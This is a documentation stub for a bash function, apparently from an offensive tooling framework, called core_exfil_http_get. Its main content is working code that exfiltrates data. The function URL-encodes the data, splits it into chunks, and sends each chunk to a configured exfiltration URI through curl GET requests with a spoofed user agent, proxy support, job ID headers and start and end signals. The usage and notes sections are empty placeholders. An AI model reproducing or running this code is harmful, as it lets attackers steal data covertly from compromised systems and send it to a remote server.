# Exfil Http Get

## Purpose

core_exfil_http_get function implementation from base.sh.

## Implementation

<details>
<summary>Function Code</summary>

```bash
core_exfil_http_get() {
local data="$1"
    local full_uri=$(core_normalize_uri "$EXFIL_URI")
    local proxy_arg=$(core_prepare_proxy_arg)
    local user_agent=$(core_get_user_agent)
    local exfil_data=$(core_prepare_exfil_data "$data")
    local encoded_data=$(core_url_safe_encode "$exfil_data")
    
    # Calculate chunk size based on URL length limits
                local max_url_length=1800
                local base_url_length=${#full_uri}
                local max_data_length=$((max_url_length - base_url_length - 50))  # 50 for other params
                local chunk_size=$CHUNK_SIZE
    
                if [ $max_data_length -lt $chunk_size ]; then
                    chunk_size=$max_data_length
                fi
                # Send start signal
                $CMD_CURL -s $proxy_arg $CMD_CURL_SECURITY $CMD_CURL_TIMEOUT \
                    -G \
                    -A "$user_agent" \
                    -H "X-Job-ID: $JOB_ID" \
                    --data-urlencode "signal=start" \
                    --data-urlencode "id=$JOB_ID" \
                    "$full_uri" > /dev/null 2>&1
                
    if [ $? -ne 0 ]; then
        return 1
    fi
    # Send data in chunks
    local chunk_num=0
    local start_pos=0
    local data_len=${#encoded_data}
    
                while [ $start_pos -lt $data_len ]; do
                    local chunk="${encoded_data:$start_pos:$chunk_size}"
                    start_pos=$((start_pos + chunk_size))
                    
                    $CMD_CURL -s $proxy_arg $CMD_CURL_SECURITY $CMD_CURL_TIMEOUT \
                        -G \
                        -A "$user_agent" \
                        -H "X-Job-ID: $JOB_ID" \
                        -H "X-Encoding: $ENCODING_TYPE" \
                        --data-urlencode "d=$chunk" \
                        --data-urlencode "id=$JOB_ID" \
                        --data-urlencode "chunk=$chunk_num" \
                        "$full_uri" > /dev/null 2>&1
            
            if [ $? -ne 0 ]; then
            return 1
                    fi
                    
                    $CMD_SLEEP 0.1  # Rate limiting
                    chunk_num=$((chunk_num + 1))
                done
                
    # Send end signal
                    $CMD_CURL -s $proxy_arg $CMD_CURL_SECURITY $CMD_CURL_TIMEOUT \
                        -G \
                        -A "$user_agent" \
                        -H "X-Job-ID: $JOB_ID" \
                        --data-urlencode "signal=end" \
                        --data-urlencode "id=$JOB_ID" \
                        --data-urlencode "chunks=$chunk_num" \
                        "$full_uri" > /dev/null 2>&1
                    
    return $?
}
```

</details>

## Usage

Document usage examples and parameters here.

## Notes

Add any implementation notes or considerations.
